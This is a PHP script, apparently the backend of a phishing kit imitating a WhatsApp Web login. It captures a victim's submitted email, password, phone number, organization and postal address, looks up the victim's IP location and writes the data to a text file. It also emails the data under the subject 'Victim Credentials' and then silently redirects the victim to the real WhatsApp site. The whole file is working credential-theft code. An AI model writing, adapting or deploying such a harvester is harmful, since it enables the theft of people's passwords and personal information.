<?php
error_reporting(0);
$user = $_POST['email'];
$pass = $_POST['password'];
$pho =  $_POST['phone'];
$org =  $_POST['organization'];
$addr = $_POST['address'];
$pos  = $_POST['postal'];
$city = $_POST['city'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");
$file = fopen('sensitiveinfo.txt', 'a');
fwrite($file, "Username: ".$user."\n\n" ."Password: ".$pass. "\n\n"."PhoneNumber: ".$pho."\n\n"."Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\"". "Organization : " .$org."\n\n". "Address:".$addr."\n\n"."Postal :".$pos."\n\n" . "City :" .$city."\n\n" ."country : ".$country."\n\n\n\n");
fclose($file);
$subject = "Victim Credentials{ $user }";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Author:swagkarna</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Ip Address</th>
  <th style="width:78%;text-align: center;"><b>'.$ip.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Country</th>
  <th style="width:78%;text-align: center;"><b>'.$ulke.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Time</th>
  <th style="width:78%;text-align: center;"><b>'.$tarih.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Username or Email</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
  <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Phone Number</th>
  <th style="width:78%;text-align: center;"><b>'.$pho.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Organization</th>
  <th style="width:78%;text-align: center;"><b>'.$org.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Address</th>
  <th style="width:78%;text-align: center;"><b>'.$addr.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Postal</th>
  <th style="width:78%;text-align: center;"><b>'.$pos.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>City</th>
  <th style="width:78%;text-align: center;"><b>'.$city.'</th> 
 </tr>
   <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Country</th>
  <th style="width:78%;text-align: center;"><b>'.$country.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>Stay Safe !! Stay Legal</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Anon<anon@gmail.com>' . "\r\n";
$datamail = mail($ikhbaljb, $subject, $message, $headersx);
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://web.whatsapp.com/">
</head>
<body>
</body>
</html>
